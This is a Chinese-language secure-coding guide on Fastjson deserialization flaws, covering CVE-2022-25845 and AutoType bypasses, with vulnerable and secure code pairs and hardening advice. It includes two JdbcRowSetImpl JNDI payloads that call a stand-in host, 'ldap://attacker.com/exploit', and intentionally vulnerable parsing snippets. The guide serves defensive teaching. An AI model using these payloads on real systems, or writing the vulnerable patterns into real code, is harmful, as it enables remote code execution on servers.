---
id: FASTJSON
name: Fastjson 安全
severity: critical
cwe: ["CWE-502"]
category: frameworks
frameworks: [Fastjson, Fastjson2]
last_updated: "2026-04-18"
doc_version: "1.0"
---

# Fastjson 安全

> 最后更新：2026-04-18

## 概述

Fastjson 是阿里巴巴开源的高性能 JSON 序列化/反序列化库，在中国 Java 开发社区广泛使用。其 AutoType 功能允许在反序列化时自动实例化任意类，这为远程代码执行（RCE）提供了攻击面。自 2017 年以来，Fastjson 持续被披露多个 AutoType 绕过漏洞，尽管官方多次修补，但新的绕过方式仍不断出现。本文档整理 Fastjson 框架相关的安全问题。

## 历史漏洞

### Fastjson AutoType 远程代码执行 (CVE-2022-25845)

| 属性 | 值 |
|------|------|
| CVE | CVE-2022-25845 |
| 影响版本 | Fastjson < 1.2.83 |
| 严重程度 | 严重（CVSS 9.8） |
| 利用条件 | 使用 Fastjson 解析不可信 JSON 数据且 AutoType 开启或可被绕过 |

**漏洞原理**：Fastjson 的 AutoType 机制允许在 JSON 中通过 `@type` 字段指定要反序列化的 Java 类。当 `autoTypeSupport` 开启时，Fastjson 会根据 `@type` 的值实例化对应类并调用其 setter/getter 方法。攻击者通过构造恶意 JSON，利用已知 Gadget 链（如 JNDI 注入、JdbcRowSetImpl 等）实现任意代码执行。即使 `autoTypeSupport` 默认关闭，也存在多种方式绕过 AutoType 黑名单校验。

**攻击示例**：
```json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker.com/exploit",
    "autoCommit": true
}
```

**修复措施**：
```xml
<!-- 升级 Fastjson 到安全版本 -->
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.83</version>
</dependency>
```

---

### AutoType 绕过漏洞系列

Fastjson 历史上存在多次 AutoType 黑名单绕过，以下列出关键 CVE：

| CVE | 影响版本 | 绕过方式 |
|-----|---------|---------|
| CVE-2017-18349 | < 1.2.25 | AutoType 默认开启，无黑名单机制 |
| - | < 1.2.42 | `L` 前缀绕过：`Lcom.sun.rowset.JdbcRowSetImpl;` |
| - | < 1.2.47 | 缓存机制绕过：使用 `java.lang.Class` 加载恶意类到缓存 |
| - | < 1.2.68 | `expectClass` 绕过：利用期望类机制绕过黑名单 |
| CVE-2022-25845 | < 1.2.83 | 多种 Gadget 链绕过 |

**缓存绕过（1.2.25 ~ 1.2.47）攻击示例**：
```json
{
    "a": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://attacker.com/exploit",
        "autoCommit": true
    }
}
```

**修复措施**：
1. 升级到 Fastjson 1.2.83+ 或迁移到 Fastjson2
2. 开启 SafeMode：`ParserConfig.getGlobalInstance().setSafeMode(true);`
3. 禁用 AutoType：不调用 `setAutoTypeSupport(true)`

---

## 常见安全问题

### 1. 开启 AutoType 支持

```java
// [VULNERABLE] 开启 AutoType 支持，允许反序列化任意类
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

String json = request.getParameter("data");
Object obj = JSON.parseObject(json, Object.class);
```

```java
// [SECURE] 开启 SafeMode，完全禁止 AutoType
ParserConfig.getGlobalInstance().setSafeMode(true);

// 使用明确的类型进行反序列化
String json = request.getParameter("data");
UserDTO user = JSON.parseObject(json, UserDTO.class);
```

### 2. 使用不安全的 parse 方法

```java
// [VULNERABLE] 使用无类型参数的 parse 方法，依赖 JSON 中的 @type 字段
String json = request.getParameter("data");
Object obj = JSON.parse(json);
```

```java
// [SECURE] 始终指定明确的反序列化目标类型
String json = request.getParameter("data");
UserDTO user = JSON.parseObject(json, UserDTO.class);
```

### 3. Fastjson 版本过旧

```xml
<!-- [VULNERABLE] 使用存在漏洞的旧版本 -->
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.47</version>
</dependency>
```

```xml
<!-- [SECURE] 使用安全版本或迁移到 Fastjson2 -->
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.83</version>
</dependency>
<!-- 推荐迁移到 Fastjson2 -->
<dependency>
    <groupId>com.alibaba.fastjson2</groupId>
    <artifactId>fastjson2</artifactId>
    <version>2.0.40</version>
</dependency>
```

### 4. Feature.SupportNonPublicField 滥用

```java
// [VULNERABLE] SupportNonPublicField 允许反序列化私有字段，扩大攻击面
String json = request.getParameter("data");
Object obj = JSON.parseObject(json, Object.class, Feature.SupportNonPublicField);
```

```java
// [SECURE] 不使用 SupportNonPublicField，使用公共字段或标准的序列化机制
String json = request.getParameter("data");
UserDTO user = JSON.parseObject(json, UserDTO.class);
```

## 安全配置建议

### 1. 升级并开启 SafeMode

```java
// 应用启动时配置
@Configuration
public class FastjsonConfig {

    @PostConstruct
    public void init() {
        // 开启 SafeMode，完全禁止 AutoType
        ParserConfig.getGlobalInstance().setSafeMode(true);
    }
}
```

### 2. 使用白名单机制

```java
// 配置 AutoType 白名单（仅当必须使用 AutoType 时）
ParserConfig config = new ParserConfig();
config.addAccept("com.yourcompany.");  // 仅允许公司包名
config.addAccept("com.yourproject.");

// 使用自定义配置进行反序列化
String json = request.getParameter("data");
Object obj = JSON.parseObject(json, Object.class, config);
```

### 3. 迁移到 Fastjson2

```xml
<!-- Fastjson2 默认不启用 AutoType，安全性更好 -->
<dependency>
    <groupId>com.alibaba.fastjson2</groupId>
    <artifactId>fastjson2</artifactId>
    <version>2.0.40</version>
</dependency>
```

```java
// Fastjson2 API 示例
String json = request.getParameter("data");
UserDTO user = JSON.parseObject(json, UserDTO.class);
```

### 4. 输入校验与过滤

```java
// 过滤 JSON 中的 @type 字段
public class JsonSanitizer {

    private static final Pattern TYPE_PATTERN = Pattern.compile(
        "\"@type\"\\s*:\\s*\"[^\"]*\"", Pattern.CASE_INSENSITIVE
    );

    public static String sanitize(String json) {
        return TYPE_PATTERN.matcher(json).replaceAll("");
    }
}

// 或使用自定义反序列化过滤器
public class SafeParseConfig extends ParserConfig {
    @Override
    public Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {
        // 严格白名单校验
        if (typeName != null && typeName.startsWith("com.yourcompany.")) {
            return super.checkAutoType(typeName, expectClass, features);
        }
        throw new JSONException("autoType is not support: " + typeName);
    }
}
```

## 参考资料

- [Fastjson 官方安全更新](https://github.com/alibaba/fastjson/wiki/security_update)
- [CVE-2022-25845 详情](https://nvd.nist.gov/vuln/detail/CVE-2022-25845)
- [Fastjson2 官方文档](https://github.com/alibaba/fastjson2)
- [Fastjson 漏洞历史分析](https://github.com/alibaba/fastjson/wiki/security_update_history)
- [OWASP 反序列化防护指南](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
